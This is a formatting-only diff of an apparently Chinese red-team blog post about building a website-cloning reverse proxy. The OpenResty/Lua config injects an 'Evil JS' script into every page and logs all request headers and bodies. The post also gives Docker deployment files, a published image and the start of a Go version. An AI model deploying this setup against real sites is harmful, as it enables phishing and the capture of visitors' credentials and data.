@@ -119,8 +119,8 @@
 <p><a href="http://openresty.org/cn/">OpenResty®</a> 是一个基于 Nginx 与 Lua 的高性能 Web 平台，其内部集成了大量精良的 Lua 库、第三方模块以及大多数的依赖项。用于方便地搭建能够处理超高并发、扩展性极高的动态 Web 应用、Web 服务和动态网关。</p>
 <p>根据它的官方文档和<a href="https://github.com/openresty/docker-openresty">开源仓库</a>我找到了Docker环境，使用Docker镜像就能解决快速部署的问题了。</p>
 <p>首先拉取镜像到本地，方便后续的操作：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">docker pull openresty/openresty:alpine
-</code></pre></div><h3 id="openresty配置文件">OpenResty配置文件</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker pull openresty/openresty:alpine
+</span></span></code></pre></div><h3 id="openresty配置文件">OpenResty配置文件</h3>
 <p>OpenResty Docker环境共有两块需要关注的配置文件：</p>
 <ul>
 <li>/etc/nginx/conf.d</li>
@@ -143,7 +143,7 @@ http {
         listen    80;
         location / {
             content_by_lua_block {
-                ngx.say(&quot;Hello,Rvn0xsy&quot;);
+                ngx.say(&#34;Hello,Rvn0xsy&#34;);
             }
         }
     }
@@ -202,22 +202,21 @@ http {
                            buffered = {}
                            ngx.ctx.buffered = buffered
                         end
-                        if chunk ~= &quot;&quot; then
+                        if chunk ~= &#34;&#34; then
                            buffered[#buffered + 1] = chunk
                            ngx.arg[1] = nil
                         end
                         if eof then
                            local whole = table.concat(buffered)
                            ngx.ctx.buffered = nil
-                           whole = whole .. &quot;&lt;script src='/7276df76835ed2272cc0e59f55e49902/static.js' type='module'&gt;&lt;/script&gt;&quot;
+                           whole = whole .. &#34;&lt;script src=&#39;/7276df76835ed2272cc0e59f55e49902/static.js&#39; type=&#39;module&#39;&gt;&lt;/script&gt;&#34;
                            ngx.arg[1] = whole
                         end
                 }
-
 </code></pre><p>在修改网页内容之前，需要通过<code>header_filter_by_lua_block</code>将<code>Content-Length</code>进行清空，因为修改后，<code>Content-Length</code>的大小一定是改变的。</p>
 <h3 id="使用es6标准将js模块化">使用ES6+标准将JS模块化</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;/7276df76835ed2272cc0e59f55e49902/static.js&#39;</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;module&#39;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
-</code></pre></div><p>其中<code>static.js</code>就是引入的Evil JS，添加了<code>type='module'</code>是为了启用<a href="https://www.freecodecamp.org/news/learn-modern-javascript/">ES6+</a>标准。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;/7276df76835ed2272cc0e59f55e49902/static.js&#39;</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;module&#39;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span></code></pre></div><p>其中<code>static.js</code>就是引入的Evil JS，添加了<code>type='module'</code>是为了启用<a href="https://www.freecodecamp.org/news/learn-modern-javascript/">ES6+</a>标准。</p>
 <p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/b087b05c-4f5f-11ec-8b14-00d861bf4abb.png" alt="2021-02-16-17-10-54"></p>
 <p>为了不和源站的目录冲突，<code>7276df76835ed2272cc0e59f55e49902</code>其实是一个虚拟的目录，通过<code>location</code>映射即可。</p>
 <pre tabindex="0"><code>location ^~ /7276df76835ed2272cc0e59f55e49902/ {
@@ -231,11 +230,11 @@ http {
 
 http {
     ....
-    log_format  logeverything  '$current_time - $remote_addr \n$request_headers \n\n$request_body\n';
+    log_format  logeverything  &#39;$current_time - $remote_addr \n$request_headers \n\n$request_body\n&#39;;
   
     server {
-            set $request_headers &quot;&quot;;
-            set $current_time &quot;&quot;;
+            set $request_headers &#34;&#34;;
+            set $current_time &#34;&#34;;
            ....
 
             location / {
@@ -260,12 +259,12 @@ http {
     include       mime.types;
     default_type  application/octet-stream;
     sendfile        on;
-    log_format  logeverything  '$current_time - $remote_addr \n$request_headers \n\n$request_body\n';
+    log_format  logeverything  &#39;$current_time - $remote_addr \n$request_headers \n\n$request_body\n&#39;;
     
 
     server {
-            set $request_headers &quot;&quot;;
-            set $current_time &quot;&quot;;
+            set $request_headers &#34;&#34;;
+            set $current_time &#34;&#34;;
 
             server_name proxy.payloads.online;
             listen 80;
@@ -286,14 +285,14 @@ http {
                            buffered = {}
                            ngx.ctx.buffered = buffered
                         end
-                        if chunk ~= &quot;&quot; then
+                        if chunk ~= &#34;&#34; then
                            buffered[#buffered + 1] = chunk
                            ngx.arg[1] = nil
                         end
                         if eof then
                            local whole = table.concat(buffered)
                            ngx.ctx.buffered = nil
-                           whole = whole .. &quot;&lt;script src='/7276df76835ed2272cc0e59f55e49902/static.js' type='module'&gt;&lt;/script&gt;&quot;
+                           whole = whole .. &#34;&lt;script src=&#39;/7276df76835ed2272cc0e59f55e49902/static.js&#39; type=&#39;module&#39;&gt;&lt;/script&gt;&#34;
                            ngx.arg[1] = whole
                         end
                 }
@@ -316,122 +315,122 @@ WORKDIR /tmp/
 COPY nginx.conf /usr/local/openresty/nginx/conf/nginx.conf
 COPY docker-entrypoint.sh /tmp/docker-entrypoint.sh
 RUN mkdir -p /tmp/pricking/static/ &amp;&amp; chmod +x /tmp/docker-entrypoint.sh 
-ENTRYPOINT [&quot;/tmp/docker-entrypoint.sh&quot;]
+ENTRYPOINT [&#34;/tmp/docker-entrypoint.sh&#34;]
 </code></pre><p>通过设置环境变量的值，就能完美克隆任意网站。</p>
 <p>docker-entrypoint.sh :</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/sh
-</span><span style="color:#75715e"></span>echo <span style="color:#e6db74">&#34;[+] Replace evil js URI...&#34;</span>
-
-sed -e <span style="color:#e6db74">&#39;s/7276df76835ed2272cc0e59f55e49902/b026324c6904b2a9cb4b88d6d61c81d1/&#39;</span> <span style="color:#ae81ff">\
-</span><span style="color:#ae81ff"></span>        -e <span style="color:#e6db74">&#34;18s/proxy.payloads.online/</span>$PROXY_PASS_HOST<span style="color:#e6db74">/g&#34;</span> <span style="color:#ae81ff">\
-</span><span style="color:#ae81ff"></span>        -e <span style="color:#e6db74">&#34;27s/payloads.online/</span>$PROXY_SOURCE_HOST<span style="color:#e6db74">/g&#34;</span> <span style="color:#ae81ff">\
-</span><span style="color:#ae81ff"></span>        -e <span style="color:#e6db74">&#34;28s/payloads.online/</span>$PROXY_SOURCE_HOST<span style="color:#e6db74">/g&#34;</span> <span style="color:#ae81ff">\
-</span><span style="color:#ae81ff"></span>        -e <span style="color:#e6db74">&#34;19s/80/</span>$NGINX_LISTEN_PORT<span style="color:#e6db74">/g&#34;</span> /usr/local/openresty/nginx/conf/nginx.conf &gt; /usr/local/openresty/nginx/conf/nginx.conf.new
-mv /usr/local/openresty/nginx/conf/nginx.conf.new /usr/local/openresty/nginx/conf/nginx.conf
-
-echo <span style="color:#e6db74">&#34;[+] Replace server name : </span>$PROXY_PASS_HOST<span style="color:#e6db74">&#34;</span>
-
-echo <span style="color:#e6db74">&#34;[+] Listen PORT : </span>$NGINX_LISTEN_PORT<span style="color:#e6db74">&#34;</span>
-echo <span style="color:#e6db74">&#34;[+] Proxy Pass Host : </span>$PROXY_SOURCE_HOST<span style="color:#e6db74">&#34;</span>
-
-echo <span style="color:#e6db74">&#34;[+] Evil js URL :  </span>$PROXY_PASS_HOST<span style="color:#e6db74">/</span>$EVIL_JS_URI<span style="color:#e6db74">/static.js&#34;</span>
-/usr/local/openresty/nginx/sbin/nginx -g <span style="color:#e6db74">&#34;daemon off;&#34;</span> -c /usr/local/openresty/nginx/conf/nginx.conf
-</code></pre></div><h3 id="nginx---docker-compose">Nginx - docker-compose</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/sh
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>echo <span style="color:#e6db74">&#34;[+] Replace evil js URI...&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sed -e <span style="color:#e6db74">&#39;s/7276df76835ed2272cc0e59f55e49902/b026324c6904b2a9cb4b88d6d61c81d1/&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>        -e <span style="color:#e6db74">&#34;18s/proxy.payloads.online/</span>$PROXY_PASS_HOST<span style="color:#e6db74">/g&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>        -e <span style="color:#e6db74">&#34;27s/payloads.online/</span>$PROXY_SOURCE_HOST<span style="color:#e6db74">/g&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>        -e <span style="color:#e6db74">&#34;28s/payloads.online/</span>$PROXY_SOURCE_HOST<span style="color:#e6db74">/g&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>        -e <span style="color:#e6db74">&#34;19s/80/</span>$NGINX_LISTEN_PORT<span style="color:#e6db74">/g&#34;</span> /usr/local/openresty/nginx/conf/nginx.conf &gt; /usr/local/openresty/nginx/conf/nginx.conf.new
+</span></span><span style="display:flex;"><span>mv /usr/local/openresty/nginx/conf/nginx.conf.new /usr/local/openresty/nginx/conf/nginx.conf
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;[+] Replace server name : </span>$PROXY_PASS_HOST<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;[+] Listen PORT : </span>$NGINX_LISTEN_PORT<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;[+] Proxy Pass Host : </span>$PROXY_SOURCE_HOST<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;[+] Evil js URL :  </span>$PROXY_PASS_HOST<span style="color:#e6db74">/</span>$EVIL_JS_URI<span style="color:#e6db74">/static.js&#34;</span>
+</span></span><span style="display:flex;"><span>/usr/local/openresty/nginx/sbin/nginx -g <span style="color:#e6db74">&#34;daemon off;&#34;</span> -c /usr/local/openresty/nginx/conf/nginx.conf
+</span></span></code></pre></div><h3 id="nginx---docker-compose">Nginx - docker-compose</h3>
 <p>我将镜像上传到了Docker镜像源中，可以通过如下docker-compose.yml创建实例：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-yml" data-lang="yml"><span style="color:#f92672">version</span>: <span style="color:#e6db74">&#39;3&#39;</span>
-<span style="color:#f92672">services</span>:
-  <span style="color:#f92672">nginx</span>:
-    <span style="color:#f92672">image</span>: <span style="color:#ae81ff">rvn0xsy/pricking:v1</span>
-    <span style="color:#f92672">ports</span>:
-     - <span style="color:#e6db74">&#34;80:80&#34;</span>
-    <span style="color:#f92672">volumes</span>:
-     - <span style="color:#ae81ff">/tmp/pricking:/tmp/pricking</span>
-    <span style="color:#f92672">environment</span>:
-      <span style="color:#f92672">PROXY_PASS_HOST</span>: <span style="color:#ae81ff">proxy.payloads.online</span>
-      <span style="color:#f92672">PROXY_SOURCE_HOST</span>: <span style="color:#ae81ff">payloads.online</span>
-      <span style="color:#f92672">NGINX_LISTEN_PORT</span>: <span style="color:#ae81ff">80</span>
-      <span style="color:#f92672">EVIL_JS_URI</span>: <span style="color:#ae81ff">b026324c6904b2a9cb4b88d6d61c81d1</span>
-</code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/b0c41b32-4f5f-11ec-a953-00d861bf4abb.png" alt="2021-02-16-17-40-24"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yml" data-lang="yml"><span style="display:flex;"><span><span style="color:#f92672">version</span>: <span style="color:#e6db74">&#39;3&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">services</span>:
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">nginx</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">image</span>: <span style="color:#ae81ff">rvn0xsy/pricking:v1</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">ports</span>:
+</span></span><span style="display:flex;"><span>     - <span style="color:#e6db74">&#34;80:80&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">volumes</span>:
+</span></span><span style="display:flex;"><span>     - <span style="color:#ae81ff">/tmp/pricking:/tmp/pricking</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">environment</span>:
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">PROXY_PASS_HOST</span>: <span style="color:#ae81ff">proxy.payloads.online</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">PROXY_SOURCE_HOST</span>: <span style="color:#ae81ff">payloads.online</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">NGINX_LISTEN_PORT</span>: <span style="color:#ae81ff">80</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">EVIL_JS_URI</span>: <span style="color:#ae81ff">b026324c6904b2a9cb4b88d6d61c81d1</span>
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/b0c41b32-4f5f-11ec-a953-00d861bf4abb.png" alt="2021-02-16-17-40-24"></p>
 <p>日志：</p>
 <p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/b1008158-4f5f-11ec-b052-00d861bf4abb.png" alt="2021-02-16-17-41-55"></p>
 <h2 id="0x03-golang实现---快速部署与完美克隆">0x03 Golang实现 - 快速部署与完美克隆</h2>
 <p>通过Google搜索“Golang http reverse proxy”发现，官方在标准库中已经包含了实现反向代理的代码：<a href="https://pkg.go.dev/net/http/httputil#NewSingleHostReverseProxy">ReverseProxy</a></p>
 <p>示例代码：<a href="https://blog.joshsoftware.com/2021/05/25/simple-and-powerful-reverseproxy-in-go/">Simple and Powerful ReverseProxy in Go</a></p>
 <p>创建一个简单的反向代理服务器只需要少量的代码，而且还不需要处理HTTPS证书问题：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#f92672">package</span> <span style="color:#a6e22e">main</span>
- 
-<span style="color:#f92672">import</span> (
-    <span style="color:#e6db74">&#34;log&#34;</span>
-    <span style="color:#e6db74">&#34;net/http&#34;</span>
-    <span style="color:#e6db74">&#34;net/http/httputil&#34;</span>
-    <span style="color:#e6db74">&#34;net/url&#34;</span>
-)
- 
-<span style="color:#75715e">// NewProxy takes target host and creates a reverse proxy
-</span><span style="color:#75715e"></span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">NewProxy</span>(<span style="color:#a6e22e">targetHost</span> <span style="color:#66d9ef">string</span>) (<span style="color:#f92672">*</span><span style="color:#a6e22e">httputil</span>.<span style="color:#a6e22e">ReverseProxy</span>, <span style="color:#66d9ef">error</span>) {
-    <span style="color:#a6e22e">url</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">url</span>.<span style="color:#a6e22e">Parse</span>(<span style="color:#a6e22e">targetHost</span>)
-    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
-        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">nil</span>, <span style="color:#a6e22e">err</span>
-    }
- 
-    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">httputil</span>.<span style="color:#a6e22e">NewSingleHostReverseProxy</span>(<span style="color:#a6e22e">url</span>), <span style="color:#66d9ef">nil</span>
-}
- 
-<span style="color:#75715e">// ProxyRequestHandler handles the http request using proxy
-</span><span style="color:#75715e"></span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">ProxyRequestHandler</span>(<span style="color:#a6e22e">proxy</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">httputil</span>.<span style="color:#a6e22e">ReverseProxy</span>) <span style="color:#66d9ef">func</span>(<span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">ResponseWriter</span>, <span style="color:#f92672">*</span><span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">Request</span>) {
-    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">func</span>(<span style="color:#a6e22e">w</span> <span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">ResponseWriter</span>, <span style="color:#a6e22e">r</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">Request</span>) {
-        <span style="color:#a6e22e">proxy</span>.<span style="color:#a6e22e">ServeHTTP</span>(<span style="color:#a6e22e">w</span>, <span style="color:#a6e22e">r</span>)
-    }
-}
- 
-<span style="color:#66d9ef">func</span> <span style="color:#a6e22e">main</span>() {
-    <span style="color:#75715e">// initialize a reverse proxy and pass the actual backend server url here
-</span><span style="color:#75715e"></span>    <span style="color:#a6e22e">proxy</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">NewProxy</span>(<span style="color:#e6db74">&#34;http://my-api-server.com&#34;</span>)
-    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
-        panic(<span style="color:#a6e22e">err</span>)
-    }
- 
-    <span style="color:#75715e">// handle all requests to your server using the proxy
-</span><span style="color:#75715e"></span>    <span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">HandleFunc</span>(<span style="color:#e6db74">&#34;/&#34;</span>, <span style="color:#a6e22e">ProxyRequestHandler</span>(<span style="color:#a6e22e">proxy</span>))
-    <span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Fatal</span>(<span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">ListenAndServe</span>(<span style="color:#e6db74">&#34;:8080&#34;</span>, <span style="color:#66d9ef">nil</span>))
-}
-</code></pre></div><p>我记得以前国内在Google被墙了后，出现了许多Google镜像网站，其实背后的原理也都是反向代理技术，只不过实现的语言不一样罢了。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#f92672">package</span> <span style="color:#a6e22e">main</span>
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> (
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;log&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;net/http&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;net/http/httputil&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;net/url&#34;</span>
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// NewProxy takes target host and creates a reverse proxy
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">NewProxy</span>(<span style="color:#a6e22e">targetHost</span> <span style="color:#66d9ef">string</span>) (<span style="color:#f92672">*</span><span style="color:#a6e22e">httputil</span>.<span style="color:#a6e22e">ReverseProxy</span>, <span style="color:#66d9ef">error</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">url</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">url</span>.<span style="color:#a6e22e">Parse</span>(<span style="color:#a6e22e">targetHost</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">nil</span>, <span style="color:#a6e22e">err</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">httputil</span>.<span style="color:#a6e22e">NewSingleHostReverseProxy</span>(<span style="color:#a6e22e">url</span>), <span style="color:#66d9ef">nil</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// ProxyRequestHandler handles the http request using proxy
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">ProxyRequestHandler</span>(<span style="color:#a6e22e">proxy</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">httputil</span>.<span style="color:#a6e22e">ReverseProxy</span>) <span style="color:#66d9ef">func</span>(<span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">ResponseWriter</span>, <span style="color:#f92672">*</span><span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">Request</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">func</span>(<span style="color:#a6e22e">w</span> <span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">ResponseWriter</span>, <span style="color:#a6e22e">r</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">Request</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">proxy</span>.<span style="color:#a6e22e">ServeHTTP</span>(<span style="color:#a6e22e">w</span>, <span style="color:#a6e22e">r</span>)
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// initialize a reverse proxy and pass the actual backend server url here
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">proxy</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">NewProxy</span>(<span style="color:#e6db74">&#34;http://my-api-server.com&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+</span></span><span style="display:flex;"><span>        panic(<span style="color:#a6e22e">err</span>)
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// handle all requests to your server using the proxy
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">HandleFunc</span>(<span style="color:#e6db74">&#34;/&#34;</span>, <span style="color:#a6e22e">ProxyRequestHandler</span>(<span style="color:#a6e22e">proxy</span>))
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Fatal</span>(<span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">ListenAndServe</span>(<span style="color:#e6db74">&#34;:8080&#34;</span>, <span style="color:#66d9ef">nil</span>))
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>我记得以前国内在Google被墙了后，出现了许多Google镜像网站，其实背后的原理也都是反向代理技术，只不过实现的语言不一样罢了。</p>
 <h3 id="修改响应内容">修改响应内容</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">NewSingleHostReverseProxy</span>(<span style="color:#a6e22e">target</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">url</span>.<span style="color:#a6e22e">URL</span>) <span style="color:#f92672">*</span><span style="color:#a6e22e">ReverseProxy</span>
-</code></pre></div><p><code>httputil.NewSingleHostReverseProxy</code>用来初始化一个结构体代理对象，结构体内有以下几个属性：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#66d9ef">type</span> <span style="color:#a6e22e">ReverseProxy</span> <span style="color:#66d9ef">struct</span> {
-	
-	<span style="color:#a6e22e">Director</span> <span style="color:#66d9ef">func</span>(<span style="color:#f92672">*</span><span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">Request</span>)
-
-	<span style="color:#a6e22e">Transport</span> <span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">RoundTripper</span>
-
-	<span style="color:#a6e22e">FlushInterval</span> <span style="color:#a6e22e">time</span>.<span style="color:#a6e22e">Duration</span>
-
-	<span style="color:#a6e22e">ErrorLog</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Logger</span>
-
-	<span style="color:#a6e22e">BufferPool</span> <span style="color:#a6e22e">BufferPool</span>
-
-	<span style="color:#a6e22e">ModifyResponse</span> <span style="color:#66d9ef">func</span>(<span style="color:#f92672">*</span><span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">Response</span>) <span style="color:#66d9ef">error</span>
-
-	<span style="color:#a6e22e">ErrorHandler</span> <span style="color:#66d9ef">func</span>(<span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">ResponseWriter</span>, <span style="color:#f92672">*</span><span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">Request</span>, <span style="color:#66d9ef">error</span>)
-}
-</code></pre></div><p>其中<code>ModifyResponse</code>是用来修改Response的，Response中包含了响应头和响应内容。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">NewSingleHostReverseProxy</span>(<span style="color:#a6e22e">target</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">url</span>.<span style="color:#a6e22e">URL</span>) <span style="color:#f92672">*</span><span style="color:#a6e22e">ReverseProxy</span>
+</span></span></code></pre></div><p><code>httputil.NewSingleHostReverseProxy</code>用来初始化一个结构体代理对象，结构体内有以下几个属性：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">type</span> <span style="color:#a6e22e">ReverseProxy</span> <span style="color:#66d9ef">struct</span> {
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">Director</span> <span style="color:#66d9ef">func</span>(<span style="color:#f92672">*</span><span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">Request</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">Transport</span> <span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">RoundTripper</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">FlushInterval</span> <span style="color:#a6e22e">time</span>.<span style="color:#a6e22e">Duration</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">ErrorLog</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Logger</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">BufferPool</span> <span style="color:#a6e22e">BufferPool</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">ModifyResponse</span> <span style="color:#66d9ef">func</span>(<span style="color:#f92672">*</span><span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">Response</span>) <span style="color:#66d9ef">error</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">ErrorHandler</span> <span style="color:#66d9ef">func</span>(<span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">ResponseWriter</span>, <span style="color:#f92672">*</span><span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">Request</span>, <span style="color:#66d9ef">error</span>)
